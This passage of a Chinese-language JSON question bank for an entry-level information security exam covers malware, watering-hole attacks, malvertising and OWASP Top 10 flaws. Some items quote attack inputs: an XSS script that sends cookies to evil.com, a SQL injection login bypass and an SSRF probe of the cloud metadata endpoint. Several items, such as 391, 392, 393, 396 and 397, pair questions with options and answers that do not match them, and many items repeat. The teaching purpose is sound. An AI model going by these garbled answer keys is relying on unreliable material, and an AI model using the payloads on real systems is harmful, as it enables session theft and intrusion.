    "question": "某跨國金融控股銀行資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
    "options": [
      "A. 實體尾隨入侵",
      "B. 阻斷服務攻擊（DDoS）",
      "C. 水坑攻擊（Watering Hole Attack）",
      "D. 字典檔暴力破解攻擊"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-389",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
    "options": [
      "A. 開放所有巨集無需提醒",
      "B. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）",
      "C. 停用 Windows Update",
      "D. 僅要求同仁自行辨識信箱來源"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-390",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為：",
    "options": [
      "A. 中間人攻擊（MitM）",
      "B. 社交工程（Social Engineering）",
      "C. 網路釣魚（Phishing）",
      "D. 惡意廣告攻擊（Malvertising）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-391",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "勒索軟體（Ransomware）最主要藉由下列何種密碼學機制來封鎖受害者電腦上的檔案？",
    "options": [
      "A. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離",
      "B. 立即重新啟動電腦嘗試修復",
      "C. 立即將備份硬碟插上受害電腦進行還原",
      "D. 立即點擊勒索信中的比特幣連結付款"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-392",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "特洛伊木馬（Trojan Horse）惡意程式與電腦蠕蟲（Worm）最主要之本質差異為何？",
    "options": [
      "A. 網站漏洞（SQL Injection）",
      "B. 邏輯炸彈（Logic Bomb）",
      "C. 電腦蠕蟲（Worm）",
      "D. 特洛伊木馬（Trojan Horse）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-393",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "具備自我複製、不需要依附宿主程式、且能透過網路主動掃描脆弱主機並自動傳播的惡意程式稱為：",
    "options": [
      "A. 巨集病毒必須由使用者手動開啟檔案",
      "B. 勒索軟體必須由黑客人工手動逐台輸入密碼",
      "C. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力",
      "D. 跨網站腳本必須由瀏覽器觸發"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-394",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "由大量受惡意程式感染並聽從攻擊者指令控制伺服器（C2 Server）指揮的受害電腦所組成之網路稱為：",
    "options": [
      "A. 殭屍節點（Botnet / Bots）",
      "B. 蜜罐（Honeypot）",
      "C. 負載平衡器（Load Balancer）",
      "D. 代理伺服器（Proxy）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-395",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "旨在取得作業系統最高權限（Kernel-level）並刻意隱蔽自身進程、網路通訊埠與註冊表痕跡之惡意工具稱為：",
    "options": [
      "A. 廣告軟體（Adware）",
      "B. Rootkit（管理者工具包 / 隱匿工具）",
      "C. 鍵盤側錄器（Keylogger）",
      "D. 勒索軟體（Ransomware）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-396",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "「無檔案惡意程式（Fileless Malware）」通常利用何種方式在受害主機上執行並達成隱匿？",
    "options": [
      "A. 網路釣魚攻擊",
      "B. 無檔案惡意程式（Fileless Malware）",
      "C. 傳統開機區引導病毒",
      "D. 磁碟壞軌故障"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-397",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "針對特定企業或組織之特定關鍵人員（如財務主管、高階主管）進行深度社交工程設計的網路釣魚郵件稱為：",
    "options": [
      "A. 忽略警告直接填寫個人資料",
      "B. 將檔案轉寄給全公司同仁幫忙確認",
      "C. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕",
      "D. 立即點擊啟用巨集以確認真實姓名"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-398",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "攻擊者預先分析目標受害者喜好，入侵受害者經常造訪之合法第三方網站並埋設漏洞利用程式的攻擊手法稱為：",
    "options": [
      "A. 阻斷服務攻擊（DDoS）",
      "B. 實體尾隨入侵",
      "C. 字典檔暴力破解攻擊",
      "D. 水坑攻擊（Watering Hole Attack）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-399",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "關於防禦電子郵件中的惡意巨集（Macro），下列何者為最安全的預設組態？",
    "options": [
      "A. 開放所有巨集無需提醒",
      "B. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）",
      "C. 停用 Windows Update",
      "D. 僅要求同仁自行辨識信箱來源"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-400",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": false,
    "question": "利用合法的網路廣告投放管道散播惡意軟體或漏洞利用程式之攻擊手法稱為：",
    "options": [
      "A. 中間人攻擊（MitM）",
      "B. 網路釣魚（Phishing）",
      "C. 惡意廣告攻擊（Malvertising）",
      "D. 社交工程（Social Engineering）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-401",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
    "options": [
      "A. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）",
      "B. 加大資料庫伺服器記憶體",
      "C. 將資料庫管理員帳號改為 root",
      "D. 僅在前端 JavaScript 阻擋單引號輸入"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-402",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某高科技晶圓代工大廠的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
    "options": [
      "A. DOM 型跨網站腳本（DOM-based XSS）",
      "B. 儲存型跨網站腳本（Stored XSS）",
      "C. 反射型跨網站腳本（Reflected XSS）",
      "D. SQL 注入攻擊（SQLi）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-403",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某金流與行動支付科技公司的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
    "options": [
      "A. 權限控制失效（Broken Access Control / IDOR）",
      "B. 阻斷服務攻擊（DDoS）",
      "C. 密碼學失效（Cryptographic Failure）",
      "D. 緩衝區溢位（Buffer Overflow）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-404",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
    "options": [
      "A. 密碼學失效（Cryptographic Failures）",
      "B. 注入攻擊",
      "C. 軟體及資料完整性失效",
      "D. 安全性設定錯誤"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-405",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
    "options": [
      "A. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性",
      "B. 取消所有使用者的登入功能",
      "C. 採用更長的使用者密碼",
      "D. 僅依賴 HTTP Referer 檢查"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-406",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某金流與行動支付科技公司的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
    "options": [
      "A. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）",
      "B. 中間人攻擊（MitM）",
      "C. 本地檔案包含（LFI）",
      "D. 跨網站腳本（XSS）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-407",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
    "options": [
      "A. 軟體供應鏈弱點",
      "B. 安全性設定錯誤（Security Misconfiguration）",
      "C. 身分識別及驗證失敗",
      "D. 注入漏洞"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-408",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
    "options": [
      "A. 資料庫會被自動清空",
      "B. 伺服器將無法解析 Cookie",
      "C. 瀏覽器將無法關閉",
      "D. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-409",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
    "options": [
      "A. 跨網站請求偽造（CSRF）",
      "B. 阻斷服務攻擊",
      "C. SQL 注入攻擊",
      "D. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-410",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為：",
    "options": [
      "A. 密碼過期",
      "B. 緩衝區溢位",
      "C. 網路斷線",
      "D. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-411",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某金流與行動支付科技公司的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
    "options": [
      "A. 將資料庫管理員帳號改為 root",
      "B. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）",
      "C. 加大資料庫伺服器記憶體",
      "D. 僅在前端 JavaScript 阻擋單引號輸入"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-412",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
    "options": [
      "A. DOM 型跨網站腳本（DOM-based XSS）",
      "B. 儲存型跨網站腳本（Stored XSS）",
      "C. 反射型跨網站腳本（Reflected XSS）",
      "D. SQL 注入攻擊（SQLi）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-413",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某大型連鎖量販流通集團的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
    "options": [
      "A. 密碼學失效（Cryptographic Failure）",
      "B. 緩衝區溢位（Buffer Overflow）",
      "C. 阻斷服務攻擊（DDoS）",
      "D. 權限控制失效（Broken Access Control / IDOR）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-414",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
    "options": [
      "A. 注入攻擊",
      "B. 安全性設定錯誤",
      "C. 密碼學失效（Cryptographic Failures）",
      "D. 軟體及資料完整性失效"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-415",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
    "options": [
      "A. 僅依賴 HTTP Referer 檢查",
      "B. 採用更長的使用者密碼",
      "C. 取消所有使用者的登入功能",
      "D. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-416",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
    "options": [
      "A. 本地檔案包含（LFI）",
      "B. 中間人攻擊（MitM）",
      "C. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）",
      "D. 跨網站腳本（XSS）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-417",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某高科技晶圓代工大廠上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
    "options": [
      "A. 軟體供應鏈弱點",
      "B. 安全性設定錯誤（Security Misconfiguration）",
      "C. 注入漏洞",
      "D. 身分識別及驗證失敗"
    ],
    "answer": "B",
    "terms": [],
